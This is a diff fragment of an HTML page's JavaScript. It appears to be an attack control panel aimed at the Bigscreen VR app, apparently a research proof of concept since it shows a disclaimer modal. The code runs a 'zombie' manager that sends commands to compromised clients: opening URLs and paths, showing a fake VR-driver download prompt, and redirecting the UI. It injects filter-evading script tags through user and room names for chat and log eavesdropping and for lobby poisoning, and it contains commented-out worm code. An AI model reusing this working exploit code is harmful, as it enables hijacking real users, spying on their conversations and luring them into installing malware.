+        sendZombieCmd(that.zombie.uuid,`
+            var _se=["ui_select_1","ui_select_2","ui_select_3","ui_select_4","ui_select_5","ui_pause","ui_error_1","ui_error_2","ui_error_3","ui_error_4","ui_error_5","CAMERA-SLR- SHUTTER","Corked","Bing Bong"];
+            var _i = 0;
+            var _id;
+            function _f(){if(_i<_se.length){Unity.playSoundEffect(_se[_i]);_i++;}else{clearInterval(_id)}};
+            _id = setInterval(_f, 200);
+        `);
+    });
+    this.controlElement.getElementsByClassName('_openURL')[0].addEventListener("submit", function (event) {
+        event.preventDefault();
+        let input = that.controlElement.getElementsByClassName('_openURL')[0].getElementsByTagName('input')[0];
+        let url = input.value;
+        // do not clear this form, user might want to use the default URL multiple times
+        // input.value = '';
+        sendZombieCmd(
+            that.zombie.uuid, // NOTE: `zombie` is here used instead of `identity`, maybe could be refactored
+            `openLink('${url}');;`
+        );
+    });
+    this.controlElement.getElementsByClassName('_openPath')[0].addEventListener("submit", function (event) {
+        event.preventDefault();
+        let input = that.controlElement.getElementsByClassName('_openPath')[0].getElementsByTagName('input')[0];
+        let path = input.value;
+        // do not clear this form, user might want to use the default path multiple times
+        // input.value = '';
+        sendZombieCmd(
+            that.zombie.uuid, // NOTE: `zombie` is here used instead of `identity`, maybe could be refactored
+            `openLink('${path}');;`
+        );
+    });
+    this.controlElement.getElementsByClassName('_fakeDriver')[0].addEventListener("submit", function (event) {
+        event.preventDefault();
+        let input = that.controlElement.getElementsByClassName('_fakeDriver')[0].getElementsByTagName('input')[0];
+        let url = input.value;
+        // do not clear this form, user might want to use the default URL multiple times
+        // input.value = '';
+        sendZombieCmd(
+            that.zombie.uuid, // NOTE: `zombie` is here used instead of `identity`, maybe could be refactored
+            `setErrorWarningText("Sorry! Additional VR driver is required.<br/>Please download and install driver.");$("#error-occurred .modal-footer button").click(function(){ openLink('${url}'); });showErrorPrompt()`
+        );
+    });
+    this.controlElement.getElementsByClassName('_redirectUI')[0].addEventListener("submit", function (event) {
+        event.preventDefault();
+        let input = that.controlElement.getElementsByClassName('_redirectUI')[0].getElementsByTagName('input')[0];
+        let url = input.value;
+        input.value = '';
+        sendZombieCmd(
+            that.zombie.uuid,
+            `window.location.replace('${url}');`
+        );
+    });
+
+    this.disable = function(){
+        function disableElement(element){
+            element.disabled = true;
+            element.classList.add('disabled');
+        }
+
+        disableElement(this.replFormInputElement);
+        disableElement(this.replFormSubmitElement);
+        this.replFormSubmitElement.classList.remove('btn-outline-danger');
+
+        disableElement(this.controlElement.getElementsByClassName('_toggleVideo')[0]);
+        disableElement(this.controlElement.getElementsByClassName('_runCalc')[0]);
+        disableElement(this.controlElement.getElementsByClassName('_runCmd')[0]);
+        disableElement(this.controlElement.getElementsByClassName('_openScreenshotDirectory')[0]);
+        disableElement(this.controlElement.getElementsByClassName('_randomizeAvatar')[0]);
+        disableElement(this.controlElement.getElementsByClassName('_exitApp')[0]);
+        disableElement(this.controlElement.getElementsByClassName('_playSoundEffects')[0]);
+        disableElement(this.controlElement.getElementsByClassName('_redirectUI')[0].getElementsByTagName('input')[0]);
+        disableElement(this.controlElement.getElementsByClassName('_redirectUI')[0].getElementsByTagName('button')[0]);
+    };
+    this.enable = function(){
+        this.replFormInputElement.disabled = false;
+        this.replFormInputElement.classList.remove('disabled');
+
+        this.replFormSubmitElement.disabled = false;
+        this.replFormSubmitElement.classList.remove('disabled');
+        this.replFormSubmitElement.classList.add('btn-outline-danger');
+    };
+
+    this.render = function(controlParent, collapseAElement){
+        controlParent.appendChild(this.controlElement);
+        collapseAElement.setAttribute('data-toggle', 'collapse');
+        collapseAElement.setAttribute('data-target', '#zombieControl-' + this.zombie.uuid);
+    };
+
+    this.renderChatMessage = function(message, roomId, date){
+        let messageElement = document.createElement('p');
+        messageElement.appendChild(
+            document.createTextNode(date.toLocaleTimeString()+' '+roomId+' '+message)
+        );
+        this.chatElement.appendChild(messageElement);
+
+        // scroll down
+        this.chatElement.scrollTop = this.chatElement.scrollHeight;
+    };
+
+    this.renderLogMessage = function(level, logArgs){
+        let logMessage = '';
+        for (let key in logArgs){
+            if(logArgs.hasOwnProperty(key)) {
+                if (typeof logArgs[key] === 'string' || logArgs[key] instanceof String) {
+                    logMessage += ' ' + logArgs[key];
+                }
+                else{
+                    logMessage += ' ' + JSON.stringify(logArgs[key]);
+                }
+            }
+        }
+
+        let messageElement = document.createElement('p');
+        if(level === 'Unity.log'){
+            messageElement.classList.add('text-info');
+        }
+        else if(level === 'Unity.logError'){
+            messageElement.classList.add('text-danger');
+        }
+        messageElement.appendChild(
+            document.createTextNode(level + logMessage)
+        );
+        this.logsElement.appendChild(messageElement);
+
+        // scroll down
+        this.logsElement.scrollTop = this.logsElement.scrollHeight;
+    };
+}
+
+function ZombiesManager(){
+    let that = this;
+    this.zombies = {};
+
+    this.zombieManagerUI = new ZombiesManagerUI(this);
+
+    this.intervalId = null;
+
+    this.update = function(){
+        for (let uuid in this.zombies){
+            if(this.zombies.hasOwnProperty(uuid)){
+                this.zombies[uuid].ping();
+                setTimeout(function(){
+                     if(that.zombies[uuid].receivedPong){
+                         that.zombieManagerUI.updateZombie(that.zombies[uuid]);
+                         that.zombies[uuid].zombieControlUI.enable();
+                     }
+                     else{
+                         that.zombieManagerUI.markZombieLost(that.zombies[uuid]);
+                         that.zombies[uuid].zombieControlUI.disable();
+                     }
+                }, 1000);
+            }
+        }
+        this.zombieManagerUI.updateFooter();
+    };
+
+    this.addZombie = function(uuid, steamId, oculusId, name){
+        let zombie = new Zombie(uuid, steamId, oculusId, name);
+        if(this.zombies[uuid]){
+            console.warn(`Zombie with uuid ${uuid} already exists. Will be overwritten.`);
+        }
+        this.zombies[uuid] = zombie;
+        this.zombieManagerUI.addZombie(zombie);
+    };
+
+    this.receivedPong = function(uuid){
+        if(! this.zombies[uuid]){
+            console.warn(`Zombie with uuid ${uuid} not found.`);
+            return;
+        }
+        this.zombies[uuid].receivedPong = true;
+    };
+
+    this.startPeriodicUpdates = function(){
+        if(this.intervalId !== null){
+            console.error('ERROR', 'Periodic updates already started.');
+            return;
+        }
+
+        this.zombieManagerUI.autorefreshInput.checked = true;
+        that.update();
+        this.intervalId = setInterval(function(){
+            that.update();
+        },5000);
+    };
+    this.stopPeriodicUpdates = function(){
+        if(this.intervalId === null){
+            console.error('ERROR', 'Cannot stop. Periodic updates are not running.');
+            return;
+        }
+
+        this.zombieManagerUI.autorefreshInput.checked = false;
+        clearInterval(this.intervalId);
+        this.intervalId = null;
+    };
+    this.togglePeriodicUpdates = function(){
+        if(this.intervalId === null){
+            this.startPeriodicUpdates();
+        }
+        else{
+            this.stopPeriodicUpdates();
+        }
+    }
+}
+
+function ZombiesManagerUI(zombieManager){
+    // TODO Maybe dynamically insert html
+    let that = this;
+    this.zombieManager = zombieManager;
+    this.cardElement = document.getElementById('zombies');
+    this.listElement = this.cardElement.querySelector('div.list-group');
+    this.updatedTimeElement = this.cardElement.querySelector('.card-footer time');
+    this.autorefreshInput = this.cardElement.querySelector('.card-footer .form-check input');
+    this.autorefreshInput.checked = false;
+
+    this.zombieControlsElement = document.getElementById('zombieControls');
+
+    this.zombiesUIs = {};
+
+    this.hideAllZombies = function(){
+        this.listElement.innerHTML = '';
+    };
+
+    this.addZombie = function(zombie){
+        let zombieUI = new ZombieUI(zombie);
+        let zombieControlUI = new ZombieControlUI(zombie);
+        zombie.zombieUI = zombieUI;
+        zombie.zombieControlUI = zombieControlUI;
+        zombieUI.render(this.listElement);
+        zombieControlUI.render(this.zombieControlsElement, zombieUI.zombieElement);
+        this.zombiesUIs[zombie.uuid] = zombieUI;
+
+        this.updateFooter();
+    };
+
+    this.updateZombie = function(zombie){
+        let zombieElement = this.zombiesUIs[zombie.uuid].zombieElement;
+        zombieElement.classList.remove('list-group-item-warning');
+        zombieElement.classList.add('list-group-item-success');
+    };
+
+    this.markZombieLost = function(zombie){
+        let zombieElement = this.zombiesUIs[zombie.uuid].zombieElement;
+        zombieElement.classList.remove('list-group-item-success');
+        zombieElement.classList.remove('list-group-item-warning');
+        zombieElement.classList.add('list-group-item-secondary');
+    };
+
+    this.updateFooter = function(){
+        this.updatedTimeElement.innerHTML = '';
+        this.updatedTimeElement.appendChild(
+            document.createTextNode((new Date).toLocaleTimeString())
+        );
+    };
+
+    this.autorefreshInput.addEventListener("click", function (event) {
+        that.zombieManager.togglePeriodicUpdates();
+    });
+}
+
+function PublicRoomsManager(){
+    let that = this;
+    this.sendSignalingMessage = function(message) {
+        this.signalingWs.send(msgpack.encode(message));
+    };
+    this.onSignalingMessage = function(event){
+        let message = msgpack.decode(new Uint8Array(event.data));
+        if(message.type === 'room-latest'){
+            that.publicRoomsUI.hideAllRooms();
+            that.publicRoomsUI.addAllRooms(message.rooms);
+        }
+        else{
+            console.warn('WARN', 'PublicRoomsManager.onSignalingMessage: Unexpected message:', message);
+        }
+    };
+
+    this.publicRoomsUI = new PublicRoomsUI(this);
+    this.intervalId = null;
+
+    this.signalingWs = new WebSocket(bigscreenSignalUrl);
+    this.signalingWs.binaryType = 'arraybuffer';
+    this.signalingWs.onopen = function (event) {
+        that.sendSignalingMessage({type: 'register-desktop'});
+    };
+    this.signalingWs.onclose = function (event) {
+        console.debug('PublicRoomson.signalingWs.onclose', event);
+    };
+    this.signalingWs.onmessage = function (event) {
+        that.onSignalingMessage(event);
+    };
+    this.signalingWs.onerror = function (event) {
+        console.error('ERROR', 'PublicRoomsManager.signalingWs.onerror', event);
+
+    };
+
+    this.startPeriodicUpdates = function(){
+        if(this.intervalId !== null){
+            console.error('ERROR', 'Periodic updates already started.');
+            return;
+        }
+
+        that.sendSignalingMessage({type: "room-latest"}); // update now
+        this.intervalId = setInterval(function(){
+            that.sendSignalingMessage({type: "room-latest"});
+        },5000); // NOTE: original Bigscreen application uses interval 5000
+    };
+
+    this.stopPeriodicUpdates = function(){
+        if(this.intervalId === null){
+            console.error('ERROR', 'Cannot stop. Periodic updates are not running.');
+            return;
+        }
+        clearInterval(this.intervalId);
+        this.intervalId = null;
+    };
+
+    this.togglePeriodicUpdates = function(){
+        if(this.intervalId === null){
+            this.startPeriodicUpdates();
+        }
+        else{
+            this.stopPeriodicUpdates();
+        }
+    }
+}
+
+function PublicRoomsUI(publicRoomsManager){
+    // TODO Maybe dynamically insert html
+    let that = this;
+    this.roomsManager = publicRoomsManager;
+    this.publicRoomsCardElement = document.getElementById('publicRooms');
+    this.publicRoomsListElement = this.publicRoomsCardElement.getElementsByTagName('ul')[0];
+    this.updatedTimeElement = this.publicRoomsCardElement.querySelector('.card-footer time');
+    this.autorefreshInput = this.publicRoomsCardElement.querySelector('.card-footer .form-check input');
+    this.autorefreshInput.checked = false;
+
+    this.hideAllRooms = function(){
+        this.publicRoomsListElement.innerHTML = '';
+    };
+
+    this.addAllRooms = function(rooms){
+        let that = this;
+        rooms.forEach(function(room){
+            let roomElement = document.createElement('li');
+            roomElement.classList.add('list-group-item');
+
+            let roomIdElement = document.createElement('span');
+            roomIdElement.classList.add('roomId');
+            roomIdElement.appendChild(document.createTextNode(room.roomId));
+            roomElement.appendChild(roomIdElement);
+            roomElement.appendChild(document.createTextNode(' (' + room.participants + '/' + room.size + ')'));
+
+            roomElement.appendChild(document.createElement('br'));
+
+            let nameElement = document.createElement('b');
+            nameElement.appendChild(document.createTextNode(room.name));
+            roomElement.appendChild(nameElement);
+            roomElement.appendChild(document.createTextNode(' · ' + room.description));
+            that.publicRoomsListElement.appendChild(roomElement);
+        });
+        this.updateFooter();
+    };
+
+    this.updateFooter = function(){
+        this.updatedTimeElement.innerHTML = '';
+        this.updatedTimeElement.appendChild(
+            document.createTextNode((new Date).toLocaleTimeString())
+        );
+    };
+
+    this.autorefreshInput.addEventListener("click", function (event) {
+        that.roomsManager.togglePeriodicUpdates();
+    });
+}
+
+function DiscoveredRoomsManager() {
+    let that = this;
+
+    this.getRoomState = function (roomId, onSuccess, onNotFound, onError) {
+        let xhr = new XMLHttpRequest();
+        xhr.overrideMimeType("application/json");
+        xhr.onload = function () {
+            if(xhr.status === 404){
+                onNotFound();
+                return;
+            }
+            let roomState = JSON.parse(xhr.responseText);
+            onSuccess(roomState);
+        };
+        xhr.onerror = function () {
+            console.error('ERROR', 'getRoomState()', xhr);
+            onError();
+        };
+        xhr.open('GET', 'https://signal2adm.bigscreenvr.com/roomstate?roomId=' + roomId, true);
+        xhr.send();
+    };
+
+    this.roomIds = [];
+
+    this.discoveredRoomsUI = new DiscoveredRoomsUI(this);
+    this.intervalId = null;
+
+    this.update = function(){
+        this.roomIds.forEach(function(roomId){
+            that.getRoomState(
+                roomId,
+                function(roomState){that.discoveredRoomsUI.updateRoom(roomState);},
+                function(){that.discoveredRoomsUI.markRoomLost(roomId);},
+                function(){console.error('Error during downloading roomstate', roomId)}
+            )
+        });
+        this.discoveredRoomsUI.updateFooter();
+    };
+
+    this.addRoom = function(roomId){
+        if(this.roomIds.includes(roomId)){
+            console.warn('WARN', 'DiscoveredRoomsManager.addRoom()', 'RoomId is already added.');
+            that.update();
+            return;
+        }
+        else{
+            this.roomIds.push(roomId);
+        }
+        this.getRoomState(
+            roomId,
+            function(roomState){that.discoveredRoomsUI.addRoom(roomState)},
+            function(){that.discoveredRoomsUI.addRoom({roomId:roomId})},
+            function(){console.error('Error during downloading roomstate', roomId)}
+        )
+    };
+
+    this.startPeriodicUpdates = function(){
+        if(this.intervalId !== null){
+            console.error('ERROR', 'Periodic updates already started.');
+            return;
+        }
+
+        this.discoveredRoomsUI.autorefreshInput.checked = true;
+        that.update();
+        this.intervalId = setInterval(function(){
+            that.update();
+        },5000);
+    };
+    this.stopPeriodicUpdates = function(){
+        if(this.intervalId === null){
+            console.error('ERROR', 'Cannot stop. Periodic updates are not running.');
+            return;
+        }
+
+        this.discoveredRoomsUI.autorefreshInput.checked = false;
+        clearInterval(this.intervalId);
+        this.intervalId = null;
+    };
+    this.togglePeriodicUpdates = function(){
+        if(this.intervalId === null){
+            this.startPeriodicUpdates();
+        }
+        else{
+            this.stopPeriodicUpdates();
+        }
+    }
+}
+
+function DiscoveredRoomsUI(discoveredRoomsManager){
+    // TODO Maybe dynamically insert html
+    let that = this;
+    this.roomsManager = discoveredRoomsManager;
+    this.cardElement = document.getElementById('discoveredRooms');
+    this.listElement = this.cardElement.getElementsByTagName('ul')[0];
+    this.updatedTimeElement = this.cardElement.querySelector('.card-footer time');
+    this.autorefreshInput = this.cardElement.querySelector('.card-footer .form-check input');
+    this.autorefreshInput.checked = false;
+    this.roomElements = {};
+
+    this.hideAllRooms = function(){
+        this.listElement.innerHTML = '';
+    };
+
+    this.addRoom = function(room){
+        let roomElement = document.createElement('li');
+        roomElement.classList.add('list-group-item');
+
+        let roomIdElement = document.createElement('span');
+        roomIdElement.classList.add('roomId');
+        roomIdElement.appendChild(document.createTextNode(room.roomId));
+        roomElement.appendChild(roomIdElement);
+        let participantsElement = document.createElement('span');
+        participantsElement.classList.add('_participants');
+        if(room.participants !== undefined && room.size !== undefined) {
+            participantsElement.appendChild(document.createTextNode(' (' + room.participants + '/' + room.size + ')'));
+        }
+        roomElement.appendChild(participantsElement);
+
+        roomElement.appendChild(document.createElement('br'));
+
+        let nameElement = document.createElement('b');
+        nameElement.appendChild(document.createTextNode(room.name ? room.name : ''));
+        roomElement.appendChild(nameElement);
+        roomElement.appendChild(document.createTextNode(' · ' + (room.description ? room.description : '')));
+
+        roomElement.classList.add('bg-warning');
+
+        this.listElement.appendChild(roomElement);
+        this.roomElements[room.roomId] = roomElement;
+
+        this.updateFooter();
+    };
+
+    this.updateRoom = function(room){
+        let roomElement = this.roomElements[room.roomId];
+        let participantsElement = roomElement.getElementsByClassName('_participants')[0];
+        participantsElement.innerHTML = '';
+        participantsElement.appendChild(document.createTextNode(' (' + room.participants + '/' + room.size + ')'));
+
+        roomElement.classList.remove('bg-warning');
+        roomElement.classList.add('bg-success');
+    };
+
+    this.markRoomLost = function(roomId){
+        let roomElement = this.roomElements[roomId];
+        let participantsElement = roomElement.getElementsByClassName('_participants')[0];
+        participantsElement.innerHTML = '';
+
+        roomElement.classList.remove('bg-success');
+        roomElement.classList.remove('bg-warning');
+        roomElement.classList.add('bg-secondary');
+    };
+
+    this.updateFooter = function(){
+        this.updatedTimeElement.innerHTML = '';
+        this.updatedTimeElement.appendChild(
+            document.createTextNode((new Date).toLocaleTimeString())
+        );
+    };
+
+    this.autorefreshInput.addEventListener("click", function (event) {
+        that.roomsManager.togglePeriodicUpdates();
+    });
+}
+
+///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+let NAME = textName;
+NAME += '<scr'+'ipt>';
+NAME += hideUsernameFromRoomPreview;
+NAME += hideFirstCommaFromRoomPreview;
+NAME += hideUsernameFromRoomParticipants;
+NAME += persistentChatEavesdropping;
+NAME += makeZombie;
+NAME += discoverRoom;
+NAME += persistentLogsEavesdropping;
+NAME += '</sc'+'ript>';
+
+// show disclaimer
+$('#disclaimerModal').modal({backdrop:'static',keyboard:false});
+
+let lobbyPoisoner = null;
+infectLobbyForm.addEventListener("submit", function (event) {
+    event.preventDefault();
+    let submitElement = infectLobbyForm.querySelector('input[type=submit]');
+    if (lobbyPoisoner === null) {
+        submitElement.disabled = true;
+        submitElement.classList.add('disabled');
+
+        // TODO: infectLobbyForm form fields `worm` and `targetUser` are currently ignored, worm=false, targetUser='Bob'
+        let roomName = 'My room.';
+        roomName += '<scr'+'ipt>';
+        roomName += `if(NAME==='Bob'){`;
+        //roomName += `function worm(){if(window._infected===undefined){var oldName=NAME;`;
+        roomName += discoverRoom;
+        //roomName += `displayDefaultState = function () { $("#room-id-info") ["hide"](); $("#room-disconnected") ["hide"](); $("#room-leave") ["show"](); $(".user-you .multiplayer-profile-image") ["removeClass"]("") ["addClass"]("profile-photo-sm multiplayer-profile-image " + USER); $(".user-you .user-name") ["text"](oldName); generateFlairs(USER, $(".user-you .flairs"), $(".user-you .user-name")); $("ul#room-participants") ["html"]("") };`;
+        //roomName += `;NAME='<sc'+'ript> '+worm.toString()+' ;worm();</sc'+'ript>'+oldName;Unity.setName(NAME);window._infected=true;}}; worm();`;
+        roomName += '}';
+        roomName += '</sc'+'ript>';
+
+        let onStarted = function () {
+            console.info('LobbyPoisoner: started.');
+            submitElement.value = 'Stop poisoning lobby';
+            submitElement.classList.toggle('btn-danger');
+            submitElement.classList.toggle('btn-success');
+            submitElement.classList.remove('disabled');
+            submitElement.disabled = false;
+        };
+        let onStopped = function () {
+            console.info('LobbyPoisoner: stopped.');
+            submitElement.value = 'Start poisoning lobby';
+            submitElement.classList.toggle('btn-danger');
+            submitElement.classList.toggle('btn-success');
+            submitElement.classList.remove('disabled');
+            submitElement.disabled = false;
+        };
+        let attackerIdentity = new Identity('John46_1', generateBigscreenUuid(), '', '');
+        lobbyPoisoner = new LobbyPoisoner(roomName, attackerIdentity, onStarted, onStopped);
+        lobbyPoisoner.start();
+    }
+    else{
+        lobbyPoisoner.stop();
+        lobbyPoisoner = null;
+    }
+});
+
+joinRoomForm.addEventListener("submit", function (event) {
+    event.preventDefault();
+    let roomId = roomIdInput.value;
+
+    if(rooms[roomId]){console.warn('You are already connected to this room.'); return;}
+
+    discoveredRoomsManager.addRoom(roomId);
+
+    let attackerIdentity = new Identity(NAME, generateBigscreenUuid(), '', '');
+    let room = new Room(roomId, attackerIdentity);
+    rooms[roomId] = room;
+    room._load(
+        function(){room.join();},
+        function(){console.error('ERROR', 'Could not load room information')}
+    );
+});
+
+let publicRoomsManager = new PublicRoomsManager();
+let discoveredRoomsManager = new DiscoveredRoomsManager();
+discoveredRoomsManager.startPeriodicUpdates();
+let zombiesManager = new ZombiesManager();
+zombiesManager.startPeriodicUpdates();
+
+</script>
+</body>
+</html>
